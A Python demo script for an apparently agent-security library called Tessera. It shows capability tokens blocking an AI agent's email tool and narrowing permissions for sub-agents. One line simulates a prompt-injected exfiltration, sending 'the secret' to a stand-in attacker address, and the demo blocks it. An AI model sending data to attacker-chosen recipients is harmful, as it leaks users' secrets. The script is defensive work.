"""Capabilities: killing ambient authority.

Run it:

    python examples/capability_demo.py

A normal agent holds a credential that can send mail to *anyone*. That ambient
authority is what makes a hijacked agent an exfiltration engine. Tessera
replaces it with a narrow, just-in-time capability minted from the plan:
"send_email to bob@co.test, this run only". Now even with perfectly clean data,
a send to the attacker is refused -- there is no capability that authorizes it.

We also show attenuation: a capability handed to a sub-agent can only ever be
*narrowed*, never broadened.
"""

from __future__ import annotations

from tessera.capabilities import CapabilityEngine, arg_equals, tool_is
from tessera.classification import Reversibility, operator_profile
from tessera.ledger import open_ledger
from tessera.policy import PolicyEngine, Strictness
from tessera.proxy import MCPInterceptor
from tessera.session import Session

TOOLS = [
    {"name": "send_email", "description": "Send an email.",
     "inputSchema": {"properties": {"to": {}, "subject": {}, "body": {}}}},
]


def build():
    sent = []

    def upstream(message):
        method = message.get("method")
        id_ = message.get("id")
        if method == "tools/list":
            return {"jsonrpc": "2.0", "id": id_, "result": {"tools": TOOLS}}
        params = message.get("params") or {}
        if params.get("name") == "send_email":
            sent.append(params.get("arguments"))
        return {"jsonrpc": "2.0", "id": id_,
                "result": {"content": [{"type": "text", "text": "sent"}], "isError": False}}

    engine = CapabilityEngine()
    session = Session(
        policy=PolicyEngine(Strictness.BALANCED),
        capability_engine=engine,
        require_capabilities=True,
        ledger=open_ledger(session_id="caps"),
    )
    session.register_tool(operator_profile(
        "send_email", reversibility=Reversibility.IRREVERSIBLE, exfiltration_capable=True))
    interceptor = MCPInterceptor(session, upstream)
    interceptor.handle_request({"jsonrpc": "2.0", "id": 1, "method": "tools/list"})
    return interceptor, session, engine, sent


def send(interceptor, id_, to, body):
    resp = interceptor.handle_request({
        "jsonrpc": "2.0", "id": id_, "method": "tools/call",
        "params": {"name": "send_email", "arguments": {"to": to, "subject": "x", "body": body}}})
    return "BLOCKED" if resp["result"].get("isError") else "ALLOWED"


def main() -> None:
    interceptor, session, engine, sent = build()

    print("=" * 68)
    print("1) No capability granted -> ambient authority is gone")
    print("=" * 68)
    print(f"   send to bob@co.test : {send(interceptor, 2, 'bob@co.test', 'hello')}")

    print("\n" + "=" * 68)
    print("2) Grant a narrow capability: send_email to bob@co.test only")
    print("=" * 68)
    cap = engine.mint(tool_is("send_email"), arg_equals("to", "bob@co.test"))
    session.grant(cap)
    print(f"   granted: {cap.describe()}")
    print(f"   send to bob@co.test     : {send(interceptor, 3, 'bob@co.test', 'hello')}")
    print(f"   send to attacker@evil   : {send(interceptor, 4, 'attacker@evil.test', 'the secret')}")

    print("\n" + "=" * 68)
    print("3) Attenuation: a sub-scope can only narrow, never broaden")
    print("=" * 68)
    child = cap.attenuate(arg_equals("subject", "Invoice"))
    print(f"   child also locks subject=Invoice: {child.describe()}")
    ok = engine.verify(child, "send_email", {"to": "bob@co.test", "subject": "Invoice"}).authorized
    no = engine.verify(child, "send_email", {"to": "bob@co.test", "subject": "Other"}).authorized
    broaden = engine.verify(child.attenuate(arg_equals("to", "carol@co.test")),
                            "send_email", {"to": "carol@co.test"}).authorized
    print(f"   child, subject=Invoice  : {'authorized' if ok else 'denied'}")
    print(f"   child, subject=Other    : {'authorized' if no else 'denied'}")
    print(f"   child trying to add carol (broaden) : {'authorized' if broaden else 'denied'}")

    print("\n" + "=" * 68)
    print("WHAT ACTUALLY GOT SENT")
    print("=" * 68)
    for e in sent:
        print(f"   send_email(to={e['to']!r})")
    assert [e["to"] for e in sent] == ["bob@co.test"], "only the authorized send should pass"
    print("\nRESULT: only the explicitly-capability-authorized email was sent. "
          "Ambient\nauthority is gone; the injected send to the attacker had no "
          "capability behind it.")


if __name__ == "__main__":
    main()
